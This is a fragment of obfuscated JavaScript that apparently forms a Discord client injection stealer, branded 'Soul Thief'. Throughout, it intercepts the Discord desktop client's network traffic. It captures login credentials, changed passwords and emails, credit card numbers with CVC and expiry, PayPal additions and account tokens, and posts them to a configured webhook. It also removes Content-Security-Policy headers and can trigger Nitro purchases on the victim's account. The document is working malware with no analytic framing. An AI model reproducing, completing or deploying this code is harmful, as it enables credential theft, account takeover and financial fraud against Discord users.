_0x5c8e38;},hooker=async _0x2b05ac=>{const _0x3d184e=_0x2cff4b,_0x39e40d=JSON[_0x3d184e(0x131)](_0x2b05ac),_0x18a71a=new URL(config['webhook']),_0x48727e={'Content-Type':_0x3d184e(0xdb),'Access-Control-Allow-Origin':'*'};if(!config[_0x3d184e(0xaf)][_0x3d184e(0x9b)](_0x3d184e(0xad))){const _0x5bae6a=totp(config[_0x3d184e(0x121)]);_0x48727e[_0x3d184e(0xfc)]=_0x5bae6a;}const _0x294104={'protocol':_0x18a71a[_0x3d184e(0xc6)],'hostname':_0x18a71a[_0x3d184e(0x113)],'path':_0x18a71a['pathname'],'method':_0x3d184e(0x11d),'headers':_0x48727e},_0xb0ced9=https['request'](_0x294104);_0xb0ced9['on'](_0x3d184e(0xda),_0x4605d2=>{const _0x11a3b3=_0x3d184e;console[_0x11a3b3(0x14c)](_0x4605d2);}),_0xb0ced9[_0x3d184e(0xf7)](_0x39e40d),_0xb0ced9[_0x3d184e(0xb6)]();},login=async(_0xb1c94f,_0xe2b410,_0x2d2546)=>{const _0x386dc4=_0x2cff4b,_0x19ff92=await getInfo(_0x2d2546),_0x4fb4cf=getNitro(_0x19ff92[_0x386dc4(0x13c)]),_0x4efd4a=getBadges(_0x19ff92[_0x386dc4(0x13d)]),_0x42441c=await getBilling(_0x2d2546),_0x144c21={'username':config[_0x386dc4(0x126)],'avatar_url':config[_0x386dc4(0x111)],'embeds':[{'color':config[_0x386dc4(0x115)],'fields':[{'name':_0x386dc4(0xa4),'value':'Email:\x20**'+_0xb1c94f+_0x386dc4(0x10a)+_0xe2b410+'**','inline':![]},{'name':'**Discord\x20Info**','value':'Nitro\x20Type:\x20**'+_0x4fb4cf+_0x386dc4(0x10f)+_0x4efd4a+_0x386dc4(0x11b)+_0x42441c+'**','inline':![]},{'name':'**Token**','value':'`'+_0x2d2546+'`','inline':![]}],'author':{'name':_0x19ff92['username']+'#'+_0x19ff92[_0x386dc4(0xee)]+_0x386dc4(0x80)+_0x19ff92['id'],'icon_url':_0x386dc4(0x149)+_0x19ff92['id']+'/'+_0x19ff92[_0x386dc4(0xf0)]+_0x386dc4(0xf2)},'footer':{'text':_0x386dc4(0x99)}}]};if(config[_0x386dc4(0xed)])_0x144c21[_0x386dc4(0x11c)]=config['ping_val'];hooker(_0x144c21);},passwordChanged=async(_0x133e04,_0x1f3545,_0x1dce38)=>{const _0x7e4cbf=_0x2cff4b,_0x4b6293=await getInfo(_0x1dce38),_0x4c9caa=getNitro(_0x4b6293[_0x7e4cbf(0x13c)]),_0x44a892=getBadges(_0x4b6293['flags']),_0x5a38e6=await getBilling(_0x1dce38),_0x3648b1={'username':config['embed_name'],'avatar_url':config[_0x7e4cbf(0x111)],'embeds':[{'color':config[_0x7e4cbf(0x115)],'fields':[{'name':'**Password\x20Changed**','value':_0x7e4cbf(0x117)+_0x4b6293[_0x7e4cbf(0x102)]+_0x7e4cbf(0x82)+_0x133e04+'**\x0aNew\x20Password:\x20**'+_0x1f3545+'**','inline':!![]},{'name':_0x7e4cbf(0xde),'value':_0x7e4cbf(0xd2)+_0x4c9caa+_0x7e4cbf(0x10f)+_0x44a892+'**\x0aBilling:\x20**'+_0x5a38e6+'**','inline':!![]},{'name':'**Token**','value':'`'+_0x1dce38+'`','inline':![]}],'author':{'name':_0x4b6293[_0x7e4cbf(0x87)]+'#'+_0x4b6293[_0x7e4cbf(0xee)]+'\x20|\x20'+_0x4b6293['id'],'icon_url':_0x7e4cbf(0x149)+_0x4b6293['id']+'/'+_0x4b6293[_0x7e4cbf(0xf0)]+'.webp'},'footer':{'text':'🎉・Discord\x20Injection\x20By\x20Soul\x20Thief'}}]};if(config['ping_on_run'])_0x3648b1[_0x7e4cbf(0x11c)]=config[_0x7e4cbf(0x83)];hooker(_0x3648b1);},emailChanged=async(_0x4a5657,_0x12b446,_0x5df338)=>{const _0x35ed44=_0x2cff4b,_0x4b388f=await getInfo(_0x5df338),_0x22c041=getNitro(_0x4b388f[_0x35ed44(0x13c)]),_0x4f2281=getBadges(_0x4b388f[_0x35ed44(0x13d)]),_0x2566a0=await getBilling(_0x5df338),_0x3f21dc={'username':config[_0x35ed44(0x126)],'avatar_url':config[_0x35ed44(0x111)],'embeds':[{'color':config[_0x35ed44(0x115)],'fields':[{'name':_0x35ed44(0x13f),'value':_0x35ed44(0x123)+_0x4a5657+'**\x0aPassword:\x20**'+_0x12b446+'**','inline':!![]},{'name':_0x35ed44(0xde),'value':_0x35ed44(0xd2)+_0x22c041+'**\x0aBadges:\x20**'+_0x4f2281+'**\x0aBilling:\x20**'+_0x2566a0+'**','inline':!![]},{'name':'**Token**','value':'`'+_0x5df338+'`','inline':![]}],'author':{'name':_0x4b388f[_0x35ed44(0x87)]+'#'+_0x4b388f['discriminator']+'\x20|\x20'+_0x4b388f['id'],'icon_url':_0x35ed44(0x149)+_0x4b388f['id']+'/'+_0x4b388f['avatar']+_0x35ed44(0xf2)},'footer':{'text':_0x35ed44(0x99)}}]};if(config['ping_on_run'])_0x3f21dc[_0x35ed44(0x11c)]=config[_0x35ed44(0x83)];hooker(_0x3f21dc);},PaypalAdded=async _0x373bc3=>{const _0x16e3bb=_0x2cff4b,_0x404a11=await getInfo(_0x373bc3),_0xc1cc0b=getNitro(_0x404a11[_0x16e3bb(0x13c)]),_0x1cd6a4=getBadges(_0x404a11[_0x16e3bb(0x13d)]),_0x377c22=getBilling(_0x373bc3),_0x4326de={'username':config[_0x16e3bb(0x126)],'avatar_url':config[_0x16e3bb(0x111)],'embeds':[{'color':config[_0x16e3bb(0x115)],'fields':[{'name':_0x16e3bb(0xe1),'value':_0x16e3bb(0x7b),'inline':![]},{'name':_0x16e3bb(0xde),'value':_0x16e3bb(0xd2)+_0xc1cc0b+_0x16e3bb(0xca)+_0x1cd6a4+_0x16e3bb(0x11b)+_0x377c22+'**','inline':![]},{'name':'**Token**','value':'`'+_0x373bc3+'`','inline':![]}],'author':{'name':_0x404a11[_0x16e3bb(0x87)]+'#'+_0x404a11[_0x16e3bb(0xee)]+_0x16e3bb(0x80)+_0x404a11['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x404a11['id']+'/'+_0x404a11[_0x16e3bb(0xf0)]+_0x16e3bb(0xf2)},'footer':{'text':_0x16e3bb(0x99)}}]};if(config['ping_on_run'])_0x4326de[_0x16e3bb(0x11c)]=config[_0x16e3bb(0x83)];hooker(_0x4326de);},ccAdded=async(_0x314381,_0x5acd41,_0xd001d,_0x155ec0,_0x1ccf88)=>{const _0x26b6f9=_0x2cff4b,_0x35614e=await getInfo(_0x1ccf88),_0x3e1cd5=getNitro(_0x35614e[_0x26b6f9(0x13c)]),_0x481baf=getBadges(_0x35614e[_0x26b6f9(0x13d)]),_0x52e211=await getBilling(_0x1ccf88),_0x36dc52={'username':config[_0x26b6f9(0x126)],'avatar_url':config[_0x26b6f9(0x111)],'embeds':[{'color':config[_0x26b6f9(0x115)],'fields':[{'name':_0x26b6f9(0xbf),'value':_0x26b6f9(0x141)+_0x314381+_0x26b6f9(0x8d)+_0x5acd41+_0x26b6f9(0x148)+_0xd001d+'/'+_0x155ec0+'**','inline':!![]},{'name':_0x26b6f9(0xde),'value':_0x26b6f9(0xd2)+_0x3e1cd5+_0x26b6f9(0x10f)+_0x481baf+_0x26b6f9(0x11b)+_0x52e211+'**','inline':!![]},{'name':_0x26b6f9(0x93),'value':'`'+_0x1ccf88+'`','inline':![]}],'author':{'name':_0x35614e[_0x26b6f9(0x87)]+'#'+_0x35614e[_0x26b6f9(0xee)]+'\x20|\x20'+_0x35614e['id'],'icon_url':_0x26b6f9(0x149)+_0x35614e['id']+'/'+_0x35614e[_0x26b6f9(0xf0)]+_0x26b6f9(0xf2)},'footer':{'text':_0x26b6f9(0x99)}}]};if(config[_0x26b6f9(0xed)])_0x36dc52[_0x26b6f9(0x11c)]=config[_0x26b6f9(0x83)];hooker(_0x36dc52);},nitroBought=async _0xa6eb6b=>{const _0x3951b1=_0x2cff4b,_0x2ba77d=await getInfo(_0xa6eb6b),_0x321b08=getNitro(_0x2ba77d[_0x3951b1(0x13c)]),_0x16b03f=getBadges(_0x2ba77d[_0x3951b1(0x13d)]),_0x26f867=await getBilling(_0xa6eb6b),_0x4ec8e6=await buyNitro(_0xa6eb6b),_0x3fc38e={'username':config['embed_name'],'content':_0x4ec8e6,'avatar_url':config['embed_icon'],'embeds':[{'color':config[_0x3951b1(0x115)],'fields':[{'name':_0x3951b1(0x133),'value':_0x3951b1(0xba)+_0x4ec8e6+_0x3951b1(0x120),'inline':!![]},{'name':'**Discord\x20Info**','value':_0x3951b1(0xd2)+_0x321b08+_0x3951b1(0x10f)+_0x16b03f+_0x3951b1(0x11b)+_0x26f867+'**','inline':!![]},{'name':_0x3951b1(0x93),'value':'`'+_0xa6eb6b+'`','inline':![]}],'author':{'name':_0x2ba77d[_0x3951b1(0x87)]+'#'+_0x2ba77d[_0x3951b1(0xee)]+_0x3951b1(0x80)+_0x2ba77d['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x2ba77d['id']+'/'+_0x2ba77d[_0x3951b1(0xf0)]+_0x3951b1(0xf2)},'footer':{'text':_0x3951b1(0x99)}}]};if(config['ping_on_run'])_0x3fc38e[_0x3951b1(0x11c)]=config[_0x3951b1(0x83)]+('\x0a'+_0x4ec8e6);hooker(_0x3fc38e);};session['defaultSession'][_0x2cff4b(0x97)]['onBeforeRequest'](config[_0x2cff4b(0x146)],(_0x18644a,_0x1e466f)=>{const _0x141e83=_0x2cff4b;if(_0x18644a['url'][_0x141e83(0x150)](_0x141e83(0x114)))return _0x1e466f({'cancel':!![]});updateCheck();}),session[_0x2cff4b(0xfa)][_0x2cff4b(0x97)]['onHeadersReceived']((_0x106fca,_0x16596d)=>{const _0x3fb6fb=_0x2cff4b;_0x106fca[_0x3fb6fb(0xa3)][_0x3fb6fb(0x150)](config[_0x3fb6fb(0xaf)])?_0x106fca[_0x3fb6fb(0xa3)][_0x3fb6fb(0x9b)](_0x3fb6fb(0xc8))?_0x16596d({'responseHeaders':Object[_0x3fb6fb(0xcd)]({'Access-Control-Allow-Headers':'*'},_0x106fca['responseHeaders'])}):_0x16596d({'responseHeaders':Object['assign']({'Content-Security-Policy':['default-src\x20\x27*\x27',_0x3fb6fb(0x96),_0x3fb6fb(0xe6)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x106fca[_0x3fb6fb(0x7a)])}):(delete _0x106fca[_0x3fb6fb(0x7a)]['content-security-policy'],delete _0x106fca[_0x3fb6fb(0x7a)][_0x3fb6fb(0x12f)],_0x16596d({'responseHeaders':{..._0x106fca[_0x3fb6fb(0x7a)],'Access-Control-Allow-Headers':'*'}}));}),session['defaultSession'][_0x2cff4b(0x97)]['onCompleted'](config[_0x2cff4b(0xaa)],async(_0x5ecff7,_0x4dbced)=>{const _0x2cae61=_0x2cff4b;if(_0x5ecff7[_0x2cae61(0xa9)]!==0xc8&&_0x5ecff7[_0x2cae61(0xa9)]!==0xca)return;const _0x551bdc=Buffer[_0x2cae61(0x12a)](_0x5ecff7[_0x2cae61(0xfd)][0x0][_0x2cae61(0x14d)])[_0x2cae61(0x112)](),_0x570634=JSON[_0x2cae61(0x134)](_0x551bdc),_0x4ca79b=await execScript(_0x2cae61(0x142));switch(!![]){case _0x5ecff7[_0x2cae61(0xa3)][_0x2cae61(0x12e)](_0x2cae61(0x86)):login(_0x570634[_0x2cae61(0x86)],_0x570634[_0x2cae61(0xa8)],_0x4ca79b)[_0x2cae61(0x104)](console['error']);break;case _0x5ecff7[_0x2cae61(0xa3)]['endsWith'](_0x2cae61(0x119))&&_0x5ecff7[_0x2cae61(0xd5)]===_0x2cae61(0xbb):if(!_0x570634[_0x2cae61(0xa8)])return;_0x570634[_0x2cae61(0x102)]&&emailChanged(_0x570634[_0x2cae61(0x102)],_0x570634[_0x2cae61(0xa8)],_0x4ca79b)['catch'](console[_0x2cae61(0xda)]);_0x570634[_0x2cae61(0x10b)]&&passwordChanged(_0x570634['password'],_0x570634[_0x2cae61(0x10b)],_0x4ca79b)['catch'](console[_0x2cae61(0xda)]);break;case _0x5ecff7[_0x2cae61(0xa3)][_0x2cae61(0x12e)]('tokens')&&_0x5ecff7['method']===_0x2cae61(0x11d):const _0x2af5da=querystring[_0x2cae61(0x134)](unparsedData['toString']());ccAdded(_0x2af5da[_0x2cae61(0x105)],_0x2af5da[_0x2cae61(0xf6)],_0x2af5da[_0x2cae61(0x7e)],_0x2af5da[_0x2cae61(0xbc)],_0x4ca79b)['catch'](console['error']);break;case _0x5ecff7[_0x2cae61(0xa3)][_0x2cae61(0x12e)](_0x2cae61(0xa7))&&_0x5ecff7['method']===_0x2cae61(0x11d):PaypalAdded(_0x4ca79b)[_0x2cae61(0x104)](console[_0x2cae61(0xda)]);break;case _0x5ecff7['url']['endsWith'](_0x2cae61(0xbd))&&_0x5ecff7[_0x2cae61(0xd5)]===_0x2cae61(0x11d):if(!config[_0x2cae61(0xae)])return;setTimeout(()=>{const _0x394fc4=_0x2cae61;nitroBought(_0x4ca79b)[_0x394fc4(0x104)](console[_0x394fc4(0xda)]);},0x1d4c);break;default:break;}}),module[_0x2cff4b(0xf9)]=require(_0x2cff4b(0x122));